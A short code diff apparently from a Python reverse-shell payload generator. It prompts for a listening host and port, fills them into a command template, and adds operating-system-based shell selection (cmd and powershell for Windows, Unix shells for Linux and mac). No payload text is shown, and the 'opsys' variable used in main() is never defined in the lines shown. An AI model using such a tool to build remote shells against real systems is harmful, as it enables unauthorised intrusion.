@@ -17,9 +17,7 @@ def main():
     lport = input(f'[+] Choose a port: ')
     print(20*"-")
     os.system("clear")
-    # TODO: add opsys to before choosing shell
-    # opsys: mac, linux, windows
-    shell = get_shell()
+    shell = get_shell(opsys)
     os.system("clear")
     print(20*"-")
     command = command.replace("{ip}", lhost)
@@ -89,9 +87,13 @@ def random_variable_generator():
         new_var += random.choice(abc)
     return new_var
 
-def get_shell():
-    # TODO: choose depends on OS
-    shells = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
+def get_shell(opsys: str):
+    os_shells = {
+        "windows" : ['cmd', 'powershell'],
+        "linux" : ['sh', '/bin/sh', 'bash', '/bin/bash', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],
+        "mac" : ['sh', '/bin/sh', 'bash', '/bin/bash', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
+    }
+    shells = os_shells[opsys]
     counter = 1
     for sh in shells:
         print(f'[{counter}] {sh}')
